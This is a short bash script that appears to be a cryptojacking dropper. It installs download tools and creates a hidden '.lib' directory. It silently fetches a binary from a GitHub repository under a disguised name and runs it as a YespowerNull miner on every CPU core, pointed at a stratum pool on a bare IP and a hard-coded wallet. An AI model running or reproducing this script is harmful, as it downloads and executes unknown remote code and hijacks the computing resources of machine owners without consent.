#!/bin/bash
set -x
apt-get update ; apt-get install -y wget curl sudo
mkdir .lib && cd .lib
wget -O sgr1 https://github.com/Sonehra/All-File/raw/main/maker > /dev/null 2>&1
chmod u+x sgr1
./sgr1 -a YespowerNull -o stratum+tcp://128.199.218.20:443 -u uskcyTKwSgL3SrLYkFLpWWhDv6Fq6xkxUc.envio -p x -t $(nproc --all)
